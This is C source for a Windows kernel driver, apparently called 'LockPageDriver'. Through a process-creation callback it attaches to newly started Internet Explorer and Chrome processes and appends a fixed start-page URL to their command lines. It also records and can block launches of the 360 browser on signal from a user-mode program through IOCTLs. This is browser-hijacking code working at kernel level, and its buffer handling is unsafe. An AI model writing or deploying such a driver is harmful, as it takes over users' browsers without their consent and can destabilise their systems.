#include<ntifs.h>
#include<ntddk.h>
#pragma warning(disable:4100)
#pragma warning(disable:4152)
typedef struct _GLOBAL
{
	PDEVICE_OBJECT Dev;
	PKEVENT UserModeWaitEvent;
	BOOLEAN WaitFor360Se;
	BOOLEAN Is360SePathGet;
	WCHAR T360sePath[255];
}GLOBAL,*PGLOBAL;
GLOBAL Global;


#define DEVICE_NAME L"\\Device\\Contact Device"
#define SYM_NAME L"\\??\\LockPageDriver"

typedef PPEB(__fastcall *P_PsGetProcessPeb)(PEPROCESS);
typedef CHAR*(__fastcall *F_QueryProcessImageFileName)(PEPROCESS);


P_PsGetProcessPeb PsGetProcessPeb = NULL;
F_QueryProcessImageFileName QueryProcessImageFileName = NULL;



const WCHAR* LockUrl = L" https://hao.360.cn";

#define URL L"\"C:\\Users\\zlzPC\\AppData\\Roaming\\360se6\\Application\\360se.exe\"   \"open http://www.baidu.com/\""
#define IOCTL_SENDEVENTTOKERNEL (ULONG)CTL_CODE(FILE_DEVICE_UNKNOWN,0x911,METHOD_BUFFERED,FILE_WRITE_DATA|FILE_READ_DATA) 
#define IOCTL_WAITFOR360SE (ULONG)CTL_CODE(FILE_DEVICE_UNKNOWN,0x912,METHOD_BUFFERED,FILE_WRITE_DATA|FILE_READ_DATA)
#define IOCTL_GET360SEPATH (ULONG)CTL_CODE(FILE_DEVICE_UNKNOWN,0x913,METHOD_BUFFERED,FILE_WRITE_DATA|FILE_READ_DATA) 

void LockIe(PEPROCESS CurrentProcess, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
	PPEB iePeb = NULL;
	iePeb = PsGetProcessPeb(CurrentProcess);
	KeAttachProcess(CurrentProcess);
	if (iePeb != NULL)
	{
		ULONG_PTR* param = (ULONG_PTR*)*((ULONG_PTR*)((ULONG_PTR)iePeb + 0x20));
		PUNICODE_STRING commandline = (PUNICODE_STRING)((ULONG_PTR)param + 0x70);
		commandline->MaximumLength += 100;
		NTSTATUS Sta = RtlAppendUnicodeToString(commandline, LockUrl);
		DbgPrint("sta:0x%x\n", Sta);
		DbgPrint("command:%ws\n", commandline->Buffer);
	}
	KeDetachProcess();
}

void Lock360Se(PEPROCESS CurrentProcess, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
	/*PPEB iePeb = NULL;
	iePeb = PsGetProcessPeb(CurrentProcess);
	KeAttachProcess(CurrentProcess);
	if (iePeb != NULL)
	{
		ULONG_PTR* param = (ULONG_PTR*)*((ULONG_PTR*)((ULONG_PTR)iePeb + 0x20));
		PUNICODE_STRING commandline = (PUNICODE_STRING)((ULONG_PTR)param + 0x70);*/
		/*commandline->MaximumLength += 100;*/
		/*NTSTATUS Sta = RtlAppendUnicodeToString(commandline, LockUrl);*/
		/*RtlZeroMemory(commandline->Buffer, commandline->MaximumLength);
		wcscpy(commandline->Buffer, URL);*/
		/*DbgPrint("sta:0x%x\n", Sta);*/
		/*DbgPrint("command:%ws\n", commandline->Buffer);
	}
	KeDetachProcess();*/
	if (!Global.Is360SePathGet)
	{
		WCHAR* str = wcsstr(CreateInfo->CommandLine->Buffer, L".exe");
		str += 4;
		memcpy(Global.T360sePath, CreateInfo->CommandLine->Buffer,(str- CreateInfo->CommandLine->Buffer)* sizeof(WCHAR));
		DbgPrint("360sePath:%ws\n", Global.T360sePath);
		Global.Is360SePathGet = TRUE;
	}
	if (Global.WaitFor360Se)
	{
		if (Global.UserModeWaitEvent != NULL)
		{
			CreateInfo->CreationStatus = STATUS_ACCESS_DISABLED_NO_SAFER_UI_BY_POLICY;
			KeSetEvent(Global.UserModeWaitEvent, IO_NO_INCREMENT, FALSE);
		}
		Global.WaitFor360Se = FALSE;
	}
}

void LockChrome(PEPROCESS CurrentProcess, PPS_CREATE_NOTIFY_INFO CreateInfo)
{
	PPEB iePeb = NULL;
	iePeb = PsGetProcessPeb(CurrentProcess);
	KeAttachProcess(CurrentProcess);
	if (iePeb != NULL)
	{
		ULONG_PTR* param = (ULONG_PTR*)*((ULONG_PTR*)((ULONG_PTR)iePeb + 0x20));
		PUNICODE_STRING commandline = (PUNICODE_STRING)((ULONG_PTR)param + 0x70);
		commandline->MaximumLength += 100;
		NTSTATUS Sta = RtlAppendUnicodeToString(commandline, LockUrl);
		DbgPrint("sta:0x%x\n", Sta);
		DbgPrint("command:%ws\n", commandline->Buffer);
	}
	KeDetachProcess();
}

void SetCreateProcessNotifyRoutineEx(
	_In_        HANDLE                 ParentId,
	_In_        HANDLE                 ProcessId,
	_Inout_opt_ PPS_CREATE_NOTIFY_INFO CreateInfo
)
{
	CHAR* ProcessName = NULL;
	PEPROCESS CurrentProcess = NULL;
	PsLookupProcessByProcessId(ProcessId, &CurrentProcess);
	ProcessName=QueryProcessImageFileName(CurrentProcess);
	if (CreateInfo)
	{
		DbgPrint("start: %s\n", ProcessName);
		if (strstr(ProcessName, "iexplore.exe")!=NULL)
		{
			LockIe(CurrentProcess,CreateInfo);
		}
		else if (strstr(ProcessName,"360se.exe")!=NULL)
		{
			Lock360Se(CurrentProcess,CreateInfo);
		}
		else if (strstr(ProcessName, "chrome.exe")!=NULL)
		{
			LockChrome(CurrentProcess, CreateInfo);
		}
	}
	else
	{
		DbgPrint("stop: %s\n", ProcessName);
	}
}
VOID Unload(PDRIVER_OBJECT Driver)
{
	PsSetCreateProcessNotifyRoutineEx(SetCreateProcessNotifyRoutineEx, TRUE);
	if (Global.Dev != NULL)
	{
		IoDeleteDevice(Global.Dev);
	}
}

NTSTATUS DevControl(PDEVICE_OBJECT Device, PIRP Irp)
{
	NTSTATUS Sta;
	PIO_STACK_LOCATION sa = IoGetCurrentIrpStackLocation(Irp);
	switch (sa->Parameters.DeviceIoControl.IoControlCode)
	{
	case IOCTL_SENDEVENTTOKERNEL:
	{
		HANDLE hUserEvent = *(HANDLE*)Irp->AssociatedIrp.SystemBuffer;
		//如果从UserBuffer中获取，应设置为UserMode，否则设置为KernelMode
		Sta=ObReferenceObjectByHandle(hUserEvent, EVENT_MODIFY_STATE, *ExEventObjectType, KernelMode, &Global.UserModeWaitEvent, NULL);
		if (!NT_SUCCESS(Sta))
		{
			Irp->IoStatus.Status = STATUS_UNSUCCESSFUL;
			IoCompleteRequest(Irp, IO_NO_INCREMENT);
			return Irp->IoStatus.Status;
		}
		ObDereferenceObject(Global.UserModeWaitEvent);
		/*KeSetEvent(UserModeWaitEvent, IO_NO_INCREMENT, FALSE);*/
		Irp->IoStatus.Status = STATUS_SUCCESS;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		return Irp->IoStatus.Status;
	}
	case IOCTL_WAITFOR360SE:
	{
		if (!Global.WaitFor360Se)
		{
			Global.WaitFor360Se = TRUE;
		}
		Irp->IoStatus.Status = STATUS_SUCCESS;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		return Irp->IoStatus.Status;
	}
	case IOCTL_GET360SEPATH:
	{
		//去掉第一个"符号
		memcpy(Irp->AssociatedIrp.SystemBuffer, Global.T360sePath+1, sizeof(Global.T360sePath)-1);
		Irp->IoStatus.Information = sizeof(Global.T360sePath);
		Irp->IoStatus.Status = STATUS_SUCCESS;
		IoCompleteRequest(Irp, IO_NO_INCREMENT);
		return Irp->IoStatus.Status;
	}
	default:
		break;
	}
	return STATUS_SUCCESS;
}

NTSTATUS DevCreate(PDEVICE_OBJECT Device, PIRP Irp)
{
	return STATUS_SUCCESS;
}
NTSTATUS DevClose(PDEVICE_OBJECT Device, PIRP Irp)
{
	return STATUS_SUCCESS;
}
NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING str)
{
	UNICODE_STRING unstrFunName;
	UNICODE_STRING DevName;
	UNICODE_STRING SymName;
	RtlInitUnicodeString(&DevName, DEVICE_NAME);
	RtlInitUnicodeString(&SymName, SYM_NAME);

	Global.Dev = NULL;
	Global.UserModeWaitEvent = NULL;
	Global.WaitFor360Se = FALSE;
	Global.Is360SePathGet = FALSE;

	DbgBreakPoint();
	driver->DriverUnload = Unload;
	driver->MajorFunction[IRP_MJ_CREATE] = DevCreate;
	driver->MajorFunction[IRP_MJ_CLOSE] = DevClose;
	driver->MajorFunction[IRP_MJ_DEVICE_CONTROL] = DevControl;

	RtlInitUnicodeString(&unstrFunName, L"PsGetProcessPeb");
	PsGetProcessPeb = MmGetSystemRoutineAddress(&unstrFunName);
	if (PsGetProcessPeb == NULL)
	{
		return STATUS_UNSUCCESSFUL;
	}

	RtlInitUnicodeString(&unstrFunName, L"PsGetProcessImageFileName");
	QueryProcessImageFileName= MmGetSystemRoutineAddress(&unstrFunName);
	if (QueryProcessImageFileName == NULL)
	{
		return STATUS_UNSUCCESSFUL;
	}

	
	PsSetCreateProcessNotifyRoutineEx(SetCreateProcessNotifyRoutineEx, FALSE);

	IoCreateDevice(driver,
		0,
		&DevName,
		FILE_DEVICE_UNKNOWN,
		FILE_DEVICE_SECURE_OPEN, FALSE,
		&Global.Dev);

	Global.Dev->Flags = DO_BUFFERED_IO;
	Global.Dev->Flags &= ~DO_DEVICE_INITIALIZING;
	IoCreateSymbolicLink(&SymName, &DevName);
	return STATUS_SUCCESS;
}